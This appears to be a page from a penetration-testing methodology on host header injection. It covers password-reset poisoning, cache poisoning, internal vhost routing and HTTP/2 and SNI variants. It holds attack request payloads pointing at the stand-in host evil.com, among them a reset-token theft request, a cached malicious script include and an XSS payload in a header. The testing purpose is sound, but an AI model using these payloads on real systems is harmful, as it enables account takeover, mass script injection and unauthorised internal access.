# Host Header Injection & Routing Abuse

**What it is:** The app trusts the `Host` (or `X-Forwarded-Host`) header to build absolute URLs, route requests, or make security decisions. Control it → poison reset links, cache, routing, and SSRF. Cheap to test, high impact when links/cache are involved.

## Where it bites
Password reset, email links, `<base>`/canonical/script URLs, cache keys, virtual-host routing, redirects, OAuth callbacks, price/region logic.

## Test knobs
```http
Host: evil.com
X-Forwarded-Host: evil.com
X-Forwarded-Server: evil.com
X-Host: evil.com
X-Forwarded-Port: 1337
Host: target.com:@evil.com
Host: target.com
X-Forwarded-Host: evil.com        # dupe: app may prefer XFH over Host
```
Also: duplicate `Host:` headers, absolute-URI request line (`GET https://target.com/ HTTP/1.1` with a different `Host`), and line-folding.

## 1. Password-reset poisoning (→ ATO)
```http
POST /api/v1/auth/forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
Content-Type: application/json

{"email":"victim@corp.com"}
```
```http
HTTP/1.1 200 OK
{"message":"reset email sent"}
```
Victim's email now contains `https://evil.com/reset?token=...` → token to attacker → takeover. (See `04-auth-session/05`.)

## 2. Web cache poisoning via unkeyed Host
If `X-Forwarded-Host` is reflected into the page but **not** part of the cache key:
```http
GET /?cb=1 HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
```
```http
HTTP/1.1 200 OK
X-Cache: miss
...<script src="https://evil.com/app.js"></script>...   ← reflected + cached for all
```
(Deep dive: `10-server-edge/03`.)

## 3. Routing / internal-vhost access (SSRF-ish)
```http
GET / HTTP/1.1
Host: internal-admin.local
```
Reverse proxy routes by `Host` → reach internal apps, admin vhosts, cloud-internal endpoints. Combine with absolute-URI smuggling.

## 4. Business-logic / security-decision abuse
- [ ] Region/price keyed off `Host` → spoof a cheaper region.
- [ ] "Trusted internal" branch enabled when `Host` looks internal.
- [ ] OAuth/redirect built from `Host` → open redirect / code theft chain.

## 5. Secondary reflection / dangling
- [ ] `Host` reflected into an HTML attribute → XSS via `X-Forwarded-Host: evil"><script>...`.
- [ ] Reflected into `<base href>` → hijacks every relative resource on the page.

## 🎯 Detection — Request → Response
Send a benign marker and grep the response + any resulting email:
```http
GET /reset HTTP/1.1
Host: target.com
X-Forwarded-Host: canary.evil.com
```
```http
HTTP/1.1 200 OK
...<link rel="canonical" href="https://canary.evil.com/reset">...   ← header trusted = vulnerable
```

## Impact
Account takeover (reset poisoning), mass XSS/redirect (cache), internal access (routing). High/critical.

## Report notes
For reset poisoning, show the received email pointing at your host. For cache, prove a clean second client gets the poisoned copy. Use benign domains; do not phish real users.

## Tools
Burp (Repeater + **Param Miner** for unkeyed headers), `nuclei` host-header templates, Collaborator.

## Deep cuts — HTTP/2, SNI, and dual-host tricks
- [ ] **HTTP/2 `:authority` vs `Host`:** send them disagreeing (or set `:authority` internal) — the front-end may route on one, the app trust the other; some stacks accept a second `Host` in the h2 header block.
- [ ] **SNI vs Host mismatch:** TLS SNI = `target.com` but `Host: internal-admin` → reach a co-hosted internal vhost the SNI-based routing wouldn't allow.
- [ ] **Absolute-URI request line:** `GET https://internal/ HTTP/1.1` with a different `Host:` header → some servers route on the request-line URI, ignoring/overriding `Host` (smuggling-adjacent, `08-infra/02`).
- [ ] **Dual/duplicate `Host` + `X-Forwarded-Host` precedence:** map which the app prefers for links vs routing vs cache key; supply both, disagreeing.
- [ ] **Host with port/userinfo/IDN:** `Host: target.com:80@evil.com`, `Host: target.com.` (trailing dot), punycode/unicode host → validator vs router disagree.
- [ ] **API vs web reset parity:** the web reset ignores `Host` but the mobile/API forgot-password builds the link from `X-Forwarded-Host` — test both endpoints (`04-auth-session/05`).
- [ ] **Cache-key host normalization:** `Host` case/port/trailing-dot not normalized into the key → poison a variant that a victim's request collides with (`08-infra/03`).
- [ ] **Secondary reflection into `<base>`/canonical/OG tags** → hijack every relative resource or leak via prefetch.

## Related
`04-auth-session/05-password-reset.md` · `10-server-edge/03-cdn-cache-poisoning-deep.md` · `10-server-edge/02-load-balancer-proxy-desync.md` · `08-infra/02-request-smuggling.md`
